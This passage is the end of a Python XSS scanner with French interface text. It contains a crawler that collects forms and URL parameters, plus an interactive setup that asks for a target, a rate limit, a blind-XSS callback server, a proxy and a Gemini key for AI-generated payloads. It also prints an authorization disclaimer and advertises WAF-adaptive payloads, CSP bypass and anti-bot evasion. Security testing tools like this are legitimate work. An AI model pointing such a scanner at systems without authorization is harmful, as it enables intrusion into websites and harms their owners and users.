        parsed_start_url = urlparse(start_url)
        if parsed_start_url.query:
            params = {k: v[0] for k, v in parse_qs(parsed_start_url.query).items()}
            discovered_targets.append({'url': parsed_start_url._replace(query="").geturl(), 'method': 'GET', 'params': params})


        while urls_to_visit:
            url, depth = urls_to_visit.popleft()
            if depth > max_depth or url in self.visited_urls: continue
            
            self.visited_urls.add(url)
            logging.info(f"Découverte des points d'entrée [Profondeur:{depth}]: {url}")
            
            try:
                await rate_limiter.wait_for_next_request() # Apply rate limit
                async with session.get(url, timeout=10, ssl=False, headers=get_random_headers()) as response:
                    if response.status != 200: continue
                    html = await response.text()
            except Exception as e:
                logging.warning(f"{YELLOW}[WARN]{END} Échec de la récupération de {url} pour la découverte des points d'entrée : {e}{Style.RESET_ALL}")
                continue

            soup = BeautifulSoup(html, 'html.parser')
            
            for form in soup.find_all('form'):
                action = form.get('action', url)
                form_url = urljoin(url, action)
                method = form.get('method', 'GET').upper()
                params = {i.get('name'): 'test' for i in form.find_all(['input', 'textarea', 'select']) if i.get('name')}
                if params:
                    discovered_targets.append({'url': form_url, 'method': method, 'params': params})
                    logging.info(f"{Fore.CYAN}Formulaire trouvé: {form_url} ({method}){Style.RESET_ALL}")

            for link_tag in soup.find_all('a', href=True):
                link = urljoin(url, link_tag['href'])
                parsed_link = urlparse(link)
                if parsed_link.netloc == self.target_domain or parsed_link.netloc.endswith(f".{self.target_domain}"): # Ensure subdomains are included
                    if parsed_link.query:
                        params = {k: v[0] for k, v in parse_qs(parsed_link.query).items()}
                        # Add a target for the URL itself if it has parameters
                        discovered_targets.append({'url': parsed_link._replace(query="").geturl(), 'method': 'GET', 'params': params})
                        logging.info(f"{Fore.CYAN}URL avec paramètres trouvée: {parsed_link._replace(query='').geturl()}{Style.RESET_ALL}")
                    if depth < max_depth and link not in crawled_links:
                        crawled_links.add(link)
                        urls_to_visit.append((link, depth + 1))
        
        return discovered_targets

def read_target_from_file(filepath):
    try:
        with open(filepath, "r") as f:
            return [url.strip() for url in f.readlines() if url.strip()]
    except FileNotFoundError:
        logging.error(f"{Fore.RED}[ERROR]{END} Fichier introuvable : {filepath}{Style.RESET_ALL}")
        return []

def terminate_scan_gracefully(signal_num, frame):
    global stop_animation 
    stop_animation = True
    print(f"\n{RED}[INFO]{END} Scan terminé par l'utilisateur ou par timeout.{Style.RESET_ALL}")
    sys.exit(0)

signal.signal(signal.SIGINT, terminate_scan_gracefully)

if __name__ == "__main__":
    print("\n" + "="*50)
    print(f"{Fore.CYAN}Bonjour Chasseur, prêt pour le test d'aujourd'hui ?{Style.RESET_ALL}")
    print("="*50 + "\n")

    target_url_input = input(f"{Fore.BLUE}Entrez l'URL ou le domaine cible (ex: testphp.vulnweb.com ou http://example.com/page?param=value): {Style.RESET_ALL}").strip()
    
    # Determine primary domain for logging from the input
    if target_url_input:
        primary_domain = normalize_domain(target_url_input)
    else:
        primary_domain = 'interactive_scan' # Default if no URL/domain provided initially via interactive CLI
    
    log_filename = setup_logging(primary_domain)
    logging.info(f"Démarrage du scanner interactif.")

    initial_target_urls = []
    if target_url_input.startswith("http://") or target_url_input.startswith("https://"):
        initial_target_urls.append(target_url_input)
    elif '.' in target_url_input: # Assume it's a domain
        initial_target_urls.append(f"http://{target_url_input}") # Add http for initial crawl
    else:
        logging.error(f"{Fore.RED}Format d'URL/domaine non valide. Veuillez réessayer.{Style.RESET_ALL}")
        sys.exit(1)

    # Number of Selenium drivers
    num_cpu_cores = multiprocessing.cpu_count()
    suggested_drivers = max(1, num_cpu_cores // 2) # Suggest half the CPU cores, minimum 1
    drivers_input = input(f"{Fore.BLUE}Combien de navigateurs Selenium voulez-vous exécuter en parallèle ? (Suggéré : {suggested_drivers}. Laisser vide pour utiliser cette suggestion): {Style.RESET_ALL}").strip()
    num_drivers = suggested_drivers
    if drivers_input.isdigit():
        num_drivers = int(drivers_input)
        if num_drivers <= 0:
            logging.warning(f"{Fore.YELLOW}Nombre de pilotes non valide, utilisation de la suggestion : {suggested_drivers}.{Style.RESET_ALL}")
            num_drivers = suggested_drivers

    # Requests Per Minute (Rate Limiting)
    rpm_input = input(f"{Fore.BLUE}Combien de requêtes par minute (RPM) voulez-vous limiter le scan ? (Ex: 30, laisser vide pour défaut 30): {Style.RESET_ALL}").strip()
    requests_per_minute = 30
    if rpm_input.isdigit():
        requests_per_minute = int(rpm_input)
        if requests_per_minute <= 0:
            logging.warning(f"{Fore.YELLOW}RPM non valide (doit être > 0), utilisation du défaut : 30 RPM.{Style.RESET_ALL}")
            requests_per_minute = 30
    elif rpm_input: # If not empty and not digit
        logging.warning(f"{Fore.YELLOW}Format RPM non valide, utilisation du défaut : 30 RPM.{Style.RESET_ALL}")


    # Blind XSS Detection
    blind_xss_choice = input(f"{Fore.BLUE}Voulez-vous détecter les XSS aveugles (Blind XSS) ? (Oui/Non): {Style.RESET_ALL}").strip().lower()
    enable_blind_xss = False
    blind_xss_callback_url = None
    if blind_xss_choice == 'oui' or blind_xss_choice == 'yes':
        enable_blind_xss = True
        callback_url_input = input(f"{Fore.BLUE}Entrez l'URL de votre serveur de rappel (ex: https://webhook.site/votre-id): {Style.RESET_ALL}").strip()
        if callback_url_input:
            blind_xss_callback_url = callback_url_input
        else:
            logging.warning(f"{Fore.YELLOW}Aucune URL de rappel fournie. Les payloads Blind XSS ne seront PAS activés.{Style.RESET_ALL}")
            enable_blind_xss = False
    
    # Proxy Configuration (Added interactive input)
    proxy_input = input(f"{Fore.BLUE}Entrez l'URL du proxy (ex: http://user:pass@host:port ou laisser vide pour aucun): {Style.RESET_ALL}").strip()
    proxy = proxy_input if proxy_input else None


    # Gemini API Key
    gemini_api_key_input = input(f"{Fore.BLUE}Entrez votre clé API Gemini (Laisser vide si vous ne voulez pas utiliser la génération de payloads par IA): {Style.RESET_ALL}").strip()
    ai_api_key = gemini_api_key_input if gemini_api_key_input else None

    # Crawl options - default to a basic crawl if not specified
    crawl_option_input = input(f"{Fore.BLUE}Type de crawl (standard, profond, ou laisser vide pour aucun crawl supplémentaire après la première URL): {Style.RESET_ALL}").strip().lower()
    crawl_option = 'none'
    if crawl_option_input == 'standard':
        crawl_option = 'crawl'
    elif crawl_option_input == 'profond':
        crawl_option = 'deepcrawl'
    
    # Max depth for crawling
    max_depth = 2 # Default depth
    if crawl_option != 'none':
        depth_input = input(f"{Fore.BLUE}Profondeur de crawl (défaut: {max_depth}. Laisser vide pour utiliser le défaut): {Style.RESET_ALL}").strip()
        if depth_input.isdigit():
            max_depth = int(depth_input)
            if max_depth <= 0:
                logging.warning(f"{Fore.YELLOW}Profondeur de crawl non valide, utilisation de la valeur par défaut : {max_depth}.{Style.RESET_ALL}")
                max_depth = 2


    # General Info and Ethical Disclaimer
    print("\n" + "="*70)
    print(f"{Fore.GREEN}À propos de ce scanner XSS avancé:{Style.RESET_ALL}")
    print("-----------------------------------")
    print(f"Ce scanner est un outil de {Fore.CYAN}test de sécurité éthique{Style.RESET_ALL} conçu pour identifier les vulnérabilités Cross-Site Scripting (XSS) dans les applications web.")
    print("\nFonctionnalités principales:")
    print(f"  - {Fore.MAGENTA}Crawling Avancé:{Style.RESET_ALL} Découvre les URLs via le crawl direct, Wayback Machine et CommonCrawl.")
    print(f"  - {Fore.MAGENTA}Détection de Points d'Entrée:{Style.RESET_ALL} Identifie les paramètres URL et les champs de formulaire potentiellement vulnérables.")
    print(f"  - {Fore.MAGENTA}Fuzzing Intelligent:{Style.RESET_ALL} Analyse la réponse du serveur pour comprendre les filtres (WAF) et adapter les payloads.")
    print(f"  - {Fore.MAGENTA}Analyse NLP du Contexte & DOM enrichie:{Style.RESET_ALL} Détermine où et comment le payload est réfléchi, et analyse l'impact direct sur le DOM (nouveaux nœuds, attributs modifiés, etc.).")
    print(f"  - {Fore.MAGENTA}Apprentissage par Renforcement (RL):{Style.RESET_ALL} Apprend des succès et des échecs pour optimiser les attaques futures, avec un feedback DOM plus riche.")
    print(f"  - {Fore.MAGENTA}Deep Learning (DL):{Style.RESET_ALL} Utilise un modèle pour filtrer les URLs et améliorer la pertinence du scan.")
    if ai_api_key:
        print(f"  - {Fore.MAGENTA}Génération de Payloads par IA (Gemini):{Style.RESET_ALL} Crée des payloads sur mesure en fonction du contexte (si la clé API est fournie), avec une optimisation via RL.")
    if enable_blind_xss:
        print(f"  - {Fore.MAGENTA}Détection Blind XSS:{Style.RESET_ALL} Utilise une URL de rappel pour identifier les XSS qui s'exécutent en arrière-plan.")
    print(f"  - {Fore.MAGENTA}Détection Avancée d'Exécution JS & DOM XSS:{Style.RESET_ALL} Simule les interactions utilisateur (clics, survols) et vérifie si le JavaScript du payload modifie réellement le DOM du navigateur.")
    print(f"  - {Fore.MAGENTA}Détection de Content Security Policy (CSP):{Style.RESET_ALL} Analyse les politiques de sécurité du contenu pour adapter les payloads de contournement.")
    print(f"  - {Fore.MAGENTA}Gestion des Captchas & Anti-bots:{Style.RESET_ALL} Intègre des logiques pour détecter les mécanismes anti-bot et adapter le comportement du navigateur.")
    print(f"  - {Fore.MAGENTA}Support de Proxy Authentifié:{Style.RESET_ALL} Permet de router le trafic via un proxy (avec ou sans authentification) pour des tests en environnement professionnel.")
    print(f"  - {Fore.MAGENTA}Limitation de Taux (Rate Limiting):{Style.RESET_ALL} Contrôle le nombre de requêtes par minute pour rester éthique et éviter le blocage par la cible.")
    print(f"  - {Fore.MAGENTA}Rapports Détaillés:{Style.RESET_ALL} Génère des rapports HTML et des Proofs of Concept (PoC) pour les vulnérabilités trouvées.")

    print("\nConsidérations Éthiques et Avertissement:")
    print(f"  - Cet outil est destiné UNIQUEMENT à des {Fore.RED}fins de test et d'audit de sécurité sur des systèmes dont vous avez l'autorisation explicite et écrite de tester.{Style.RESET_ALL}")
    print(f"  - L'utilisation non autorisée de ce scanner sur des systèmes que vous ne possédez pas ou pour lesquels vous n'avez pas d'autorisation est {Fore.RED}illégale et contraire à l'éthique.{Style.RESET_ALL}")
    print(f"  - Soyez conscient que des scans intensifs peuvent {Fore.YELLOW}affecter la performance{Style.RESET_ALL} ou la disponibilité des sites web.")
    print(f"  - Utilisez cet outil de manière responsable pour {Fore.GREEN}améliorer la sécurité et protéger les applications web.{Style.RESET_ALL}")
    print("="*70 + "\n")

    confirmation = input(f"{Fore.BLUE}Êtes-vous sûr de vouloir continuer avec ces paramètres ? (Oui/Non): {Style.RESET_ALL}").strip().lower()

    if confirmation != 'oui' and confirmation != 'yes':
        print(f"{Fore.RED}Scan annulé par l'utilisateur.{Style.RESET_ALL}")
        stop_animation = True
        sys.exit(0)

    # Initialize scanner with interactive inputs
    scanner = AsyncXSSScanner(
        target_urls=initial_target_urls,
        max_depth=max_depth,
        num_drivers=num_drivers,
        ai_api_key=ai_api_key,
        proxy=proxy, 
        report_file="xss_report.html", # Default report file
        use_model=True, # Always use model if enabled by design of advanced scanner
        enable_blind_xss=enable_blind_xss,
        blind_xss_callback_url=blind_xss_callback_url,
        requests_per_minute=requests_per_minute # Pass the RPM to the scanner
    )
    
    timer = None
    try:
        asyncio.run(scanner.run(crawl_option=crawl_option))
    except KeyboardInterrupt:
        logging.info("\nScan interrompu par l'utilisateur.")
    except Exception as e:
        logging.error(f"Une erreur fatale s'est produite : {e}", exc_info=True)
    finally:
        if timer and timer.is_alive(): timer.cancel()
        if not db_queue.empty():
            db_queue.put("terminate")
            db_queue.join()
        if db_connection: db_connection.close()
        stop_animation = True
        if cursor_thread.is_alive(): cursor_thread.join(timeout=1)

